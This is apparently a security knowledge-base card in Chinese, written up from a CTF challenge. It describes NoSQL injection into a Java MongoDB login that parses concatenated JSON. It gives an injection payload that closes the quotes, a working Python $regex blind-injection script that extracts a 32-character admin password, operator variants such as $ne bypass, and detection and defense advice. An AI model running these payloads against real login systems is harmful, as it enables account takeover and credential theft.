---
id: web-generic-sqli-mongodb-java-json-concat-regex-blind
title: Java MongoDB 查询字符串拼接注入：username/password 直拼 JSON 后 JSON.parse 进 find，$regex 前缀盲注爆 32 位随机密码
type: scenario
domain: web
path: web/generic/sqli
technique: mongodb-json-string-concat-regex-blind
tags:
- web
- java
- mongodb
- nosql
- injection
- regex
- blind
- json
- auth-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T11:47:03+08:00'
  notes: 已对照原文与图01-08核对：登录页/POST /login、NoSQLDatabase 单例 seedData 写入 admin+32 位随机密码、FindByNamePassword 的 stringQuery 拼接与 JSON.parse/find、注入 payload 返回 password incorrect、脚本按 username or password incorrect 差异做 $regex 前缀盲注，均与卡片一致；子串 'username or password incorrect' 判定、charset 与 32 位循环逐字核对。dedup 唯一 related 为 Node.js 嵌套对象注入（语言/入口/oracle 不同）；dup-scan 无本卡 pair。未实际运行 PoC（原文已跑出密码）；CTF 题无版本区间。
url: /docs/web/generic/sqli/web-generic-sqli-mongodb-java-json-concat-regex-blind/
draft: false
kb_aliases:
- MongoDB NoSQL 注入
- Java NoSQL 注入
- $regex 前缀盲注
- JSON.parse 查询注入
- $or $comment 注入
- username or password incorrect oracle
---

## 一句话结论

Java 登录接口把 `username`、`password` 直接拼进 `{ 'username' : '...', 'password' : '...' }` 字符串再 `JSON.parse` 成 MongoDB 查询时，提交 `username=admin', $or: [{}, {'a': 'a&password='}], $comment: '123456` 可注入操作符并按"用户名不存在"与"密码不正确"的差异建立布尔 oracle；再用 `$regex: '^<prefix>.*'` 逐位爆破，即可跑出 32 位随机管理员密码并登录拿 flag。

## 原理

- **拼接构造查询**：漏洞代码 `String stringQuery = "{ 'username' : '" + name + "', 'password' : '" + password + "' }";`，随后 `(DBObject) JSON.parse(stringQuery)` 并 `collection.find(databaseQuery)`。用户输入未做类型/字符校验。
- **JSON 注入操作符**：MongoDB 查询是 BSON 文档，字段值可以是操作符对象。输入里的单引号可闭合字符串，随后追加 `$or`、`$comment` 等操作符；`$comment` 用来吞掉模板剩余部分，使整体仍是合法 JSON。
- **布尔 oracle**：查询命中文档时返回 `password incorrect`；查询不到时返回 `username or password incorrect`。脚本以"响应不含 `username or password incorrect`"作为命中条件。
- **$regex 前缀盲注**：把 password 字段改成 `{'$regex': '^<已知前缀><猜测字符>.*'}`，MongoDB 在服务端对存储的密码做正则匹配；匹配成功即进入 `password incorrect` 分支，从而逐位确定密码。
- **为什么最终能登录**：盲注得到完整 32 位随机密码后，用 `admin + 真实密码` 正常登录，服务端密码比对通过，读取 flag。

## 触发条件

- 后端为 MongoDB，查询由 Java 驱动构造，且把请求参数拼接成 JSON/查询字符串后 `JSON.parse` 或等价解析。
- 登录/查询接口对"用户不存在"与"密码错误"返回不同消息（或其它可区分命中/未命中的响应）。
- 用户输入未限制引号、`$`、JSON 结构字符；MongoDB 版本支持 `$regex`（常规版本均支持）。
- 攻击者可访问登录接口。

## 利用步骤

1. 正常登录，记录两类错误消息：`username or password incorrect`（查无用户）与 `password incorrect`（用户存在）。
2. 发送 `username=admin', $or: [ {}, {'a': 'a&password=' }], $comment: '123456`，若响应变为 `password incorrect`，说明注入成功且命中 admin。
3. 用 `password="','password':{'$regex':'^<prefix><char>.*'},'username':'admin"` 逐位测试字符集 `abcdefghijklmnopqrstuvwxyz0123456789`，命中即追加前缀。
4. 跑满 32 位后用真实密码登录，读取 flag。

## PoC

原文请求（Burp，POST /login，`application/x-www-form-urlencoded`）：

```http
username=admin', $or: [ {}, {'a': 'a&password=' }], $comment: '123456
```

盲注脚本（原文）：

```python
import requests

url = "http://127.0.0.1:9999/login"
mylist = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""
proxies = {}

for i in range(32):
    for j in mylist:
        data = {
            "username": "admin",
            "password": "','password':{'$regex':'^" + password + j + ".*'},'username':'admin"
        }
        r = requests.post(url, data=data, proxies=proxies)
        if r.text.find("username or password incorrect") == -1:
            password += j
            print(password)
```

## 变体与关联

- **认证绕过变体**：`username[$ne]=x&password[$ne]=x` 一类操作符注入（需后端把参数当对象处理）可直接登录；本文是字符串拼接 + JSON 注入，需闭合引号。
- **盲注变体**：`$regex` 也可换成 `$gt/$lt/$in` 做范围/枚举 oracle；有回显时可用 `$where` 执行 JS（旧版本）或 `$comment` 辅助截断。
- **其它语言**：Node.js 嵌套 JSON 操作符注入见 [[web-nodejs-mongodb-json-operator-injection-prefix-oracle]]，原理相同、注入入口不同。
- **边界**：应用使用强类型 Criteria/QueryBuilder、对 `$` 开头键做拒绝、错误消息统一、或只允许字符串类型时，不成立。

## 检测与防御

- **查询构造**：禁止字符串拼接查询；使用驱动提供的强类型查询构造器，参数只作为值传入。
- **输入校验**：用户名/密码只允许预期字符集；拒绝以 `$` 开头的键、对象/数组类型和嵌套 JSON。
- **错误消息**：登录失败统一返回同一文案与状态码，避免区分"用户不存在/密码错误"。
- **检测**：登录请求中出现 `$regex`、`$or`、`$comment`、`$ne`、`$where`、`'` + `{` 等特征；短时间大量登录请求且响应长度呈二分/前缀规律；MongoDB 慢查询/正则查询异常增多。
- **加固**：数据库账号最小权限；对登录接口做限速与告警；开启 MongoDB 认证与审计。
